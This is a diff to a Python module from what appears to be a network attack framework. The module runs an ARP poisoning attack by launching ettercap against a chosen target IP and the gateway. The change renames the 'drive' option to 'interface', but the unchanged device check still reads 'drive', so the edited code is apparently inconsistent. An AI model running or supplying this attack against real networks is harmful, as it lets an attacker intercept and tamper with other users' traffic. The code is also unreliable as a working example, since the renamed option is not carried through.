@@ -25,10 +25,10 @@ def init():
 
 	# DEFAULT OPTIONS MODULE
 	init.options = {
-		# NAME    VALUE            RQ     DESCRIPTION
-		'drive'  :["eth0"         ,True ,'Range Scan'],
-		'target' :["192.168.1.223",True ,'Target IP'],
-		'gateway':[get_gateway()  ,True ,'Gateway IP']
+		# NAME      VALUE            RQ     DESCRIPTION
+		'interface':["eth0"         ,True ,'Range Scan'],
+		'target'   :["192.168.1.223",True ,'Target IP'],
+		'gateway'  :[get_gateway()  ,True ,'Gateway IP']
 	}
 	return init
 # END INFORMATION MODULE
@@ -38,8 +38,8 @@ def main(run):
 
 	if isConect() and checkDevice(init.var['drive']):
 		printAlert(0,"Starting ARP Poisoning...")
-		Subprocess("ettercap -T -M ARP /"+init.var['target']+"// /"+init.var['gateway']+"// -i "+init.var['drive'])
-		raw_input(printAlert(8,"Stop Attack ARP (PRESS ANY KEY)"))
+		Subprocess("ettercap -T -M ARP /"+init.var['target']+"// /"+init.var['gateway']+"// -i "+init.var['interface'])
+		raw_input(printAlert(8,"Stop Attack ARP (PRESS ANY KEY)\n"))
 		commands.getoutput("killall ettercap")	
 
 # END CODE MODULE ############################################################################################
